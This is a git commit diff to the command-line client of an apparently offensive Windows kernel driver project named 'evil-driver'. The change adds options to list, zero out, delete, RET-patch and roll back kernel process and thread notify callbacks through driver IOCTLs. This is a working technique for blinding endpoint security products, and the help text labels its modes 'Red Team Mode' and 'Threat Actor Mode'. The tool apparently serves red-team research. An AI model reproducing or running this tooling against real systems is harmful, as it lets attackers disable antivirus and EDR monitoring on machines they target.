b8ec3bccaadc049d91989cbcb44857a4a9ac7b5b
Matteo Malvica <matteo@malvica.com>
2020-07-09 20:42:17 +0200

    added thread callbacks support
    added thread callbacks support and normalized some opcode to support multiple versions

--- evil-driver/evilcli/evilcli.cpp
+++ evil-driver/evilcli/evilcli.cpp
@@ -13,21 +13,38 @@ void Usage()
 	printf("Usage: evilcli.exe <options>\n");
 	printf("Options:\n");
 	printf("  -h\t\tShow this message.\n");
-	printf("  -l\t\tProcess Notify Callbacks Address's List.\n");
-	printf("  -z\t\tZero out Process Notify Callback's Array (Cowboy Mode).\n");
-	printf("  -d <index>\tDelete Specific Process Notify Callback (Red Team Mode).\n");
-	printf("  -p <index>\tPatch Specific Process Notify Callback (Threat Actor Mode).\n");
-	printf("  -r <index>\tRollback to the original Process Notify Callback (Thoughtful Ninja Mode).\n");
+	printf("  -l\t\tProcess & Thread Notify Callbacks Address's List.\n");
+	printf("<Process Callbacks>\n");
+	printf("  -zp\t\tZero out Process Notify Callback's Array (Cowboy Mode).\n");
+	printf("  -dp <index>\tDelete Specific Process Notify Callback (Red Team Mode).\n");
+	printf("  -pp <index>\tPatch Specific Process Notify Callback (Threat Actor Mode).\n");
+	printf("  -rp <index>\tRollback to the original Process Notify Callback (Thoughtful Ninja Mode).\n");
+	printf("<Threads Callbacks>\n");
+	printf("  -zt\t\tZero out Thread Notify Callback's Array (Cowboy Mode).\n");
+	printf("  -dt <index>\tDelete Specific Thread Notify Callback (Red Team Mode).\n");
+	printf("  -pt <index>\tPatch Specific Thread Notify Callback (Threat Actor Mode).\n");
+	printf("  -rt <index>\tRollback to the original Thread Notify Callback (Thoughtful Ninja Mode).\n");
 }
 
 void DisplayInfo(BYTE* buffer, DWORD size) {
 	auto count = size;
+	int index_comp = 0;
+	bool flag = 0;
 	while (count > 0)
 	{
 		auto index = *(ULONG64*)buffer;
 		buffer += 8;
 		auto addr = *(ULONG64*)buffer;
 		buffer += 8;
+		if ((index == 0) & (index == index_comp)) {
+			printf("[*] Process Callbacks\n");
+			
+		}
+
+		if ((flag == 0) & (index < index_comp)) {
+			printf("[*] Thread Callbacks\n");
+			flag = 1;
+		}
 
 		printf("[%02llu] 0x%llx", index, addr);
 
@@ -41,6 +58,9 @@ void DisplayInfo(BYTE* buffer, DWORD size) {
 		printf(" (%s + 0x%llx)\n", ModuleName, ModuleBase);
 
 		count = count - 8 - 32;
+
+		index_comp++;
+	
 	}
 }
 
@@ -50,6 +70,7 @@ int main(int argc, const char* argv[]) {
 		return 0;
 	}
 
+	fflush(stdout);
 	HANDLE hDevice = CreateFile(L"\\\\.\\Evil", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
 	if (hDevice == INVALID_HANDLE_VALUE)
 		return Error("[-] Failed to open device");
@@ -62,11 +83,18 @@ int main(int argc, const char* argv[]) {
 	InputBuffer.remove = 0;
 	InputBuffer.index = 65;
 
-	if (strcmp(argv[1], "-z") == 0)
+	if (strcmp(argv[1], "-zp") == 0)
 	{
 		InputBuffer.remove = 1;
-		success = DeviceIoControl(hDevice, IOCTL_EVIL_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+		success = DeviceIoControl(hDevice, IOCTL_EVIL_PROCESS_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
 	}
+
+	if (strcmp(argv[1], "-zt") == 0)
+	{
+		InputBuffer.remove = 1;
+		success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_ZEROOUT_ARRAY, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+	}
+
 	else if (strcmp(argv[1], "-m") == 0) // not in the help menu
 	{
 		success = DeviceIoControl(hDevice, IOCTL_EVIL_LIST_MODULES, nullptr, 0, &OutputBuffer, 0, &lpBytesReturned, nullptr);
@@ -75,41 +103,82 @@ int main(int argc, const char* argv[]) {
 	{
 		success = DeviceIoControl(hDevice, IOCTL_EVIL_LIST_MODULES, nullptr, 0, &OutputBuffer, 0, &lpBytesReturned, nullptr);
 	}
-	else if (strcmp(argv[1], "-p") == 0)
+	else if (strcmp(argv[1], "-pp") == 0)
 	{
 		InputBuffer.index = atoi(argv[2]);
 		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
 		{
 			printf("Patching index: %d with a RET (0xc3)\n", InputBuffer.index);
-			success = DeviceIoControl(hDevice, IOCTL_EVIL_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_PROCESS_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
 		}
 		else
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
 	}
-	else if (strcmp(argv[1], "-r") == 0)
+
+	else if (strcmp(argv[1], "-pt") == 0)
+	{
+		InputBuffer.index = atoi(argv[2]);
+		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+		{
+			printf("Patching index: %d with a RET (0xc3)\n", InputBuffer.index);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_CALLBACK_RET, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+		}
+		else
+			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
+	else if (strcmp(argv[1], "-rp") == 0)
 	{
 		InputBuffer.index = atoi(argv[2]);
 		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
 		{
 			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
-			success = DeviceIoControl(hDevice, IOCTL_EVIL_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_PROCESS_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
 		}
 		else
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
 	}
-	else if (strcmp(argv[1], "-d") == 0)
+
+	else if (strcmp(argv[1], "-rt") == 0)
+	{
+		InputBuffer.index = atoi(argv[2]);
+		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+		{
+			printf("Rolling back patched index: %d to the original values\n", InputBuffer.index);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_ROLLBACK_RET, &InputBuffer, sizeof(InputBuffer), nullptr, 0, &lpBytesReturned, nullptr);
+		}
+		else
+			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
+	else if (strcmp(argv[1], "-dp") == 0)
 	{
 		InputBuffer.index = atoi(argv[2]);
 		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
 		{
 			printf("Removing index: %d\n", InputBuffer.index);
-			success = DeviceIoControl(hDevice, IOCTL_EVIL_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_PROCESS_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
 		}
 		else
 			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
 	}
+
+	else if (strcmp(argv[1], "-dt") == 0)
+	{
+		InputBuffer.index = atoi(argv[2]);
+		if (InputBuffer.index >= 0 && InputBuffer.index < 65)
+		{
+			printf("Removing index: %d\n", InputBuffer.index);
+			success = DeviceIoControl(hDevice, IOCTL_EVIL_THREAD_DELETE_CALLBACK, &InputBuffer, sizeof(InputBuffer), &OutputBuffer, 0, &lpBytesReturned, nullptr);
+		}
+		else
+			printf("[-] Valid indexes are between 0 and 64. Please try harder.\n");
+	}
+
+
 	else if (strcmp(argv[1], "-l") == 0)
 	{
+		fflush(stdout);
 		int count = 0;
 		auto hFile = ::CreateFile(L"\\\\.\\Evil", GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
 		if (hFile == INVALID_HANDLE_VALUE)
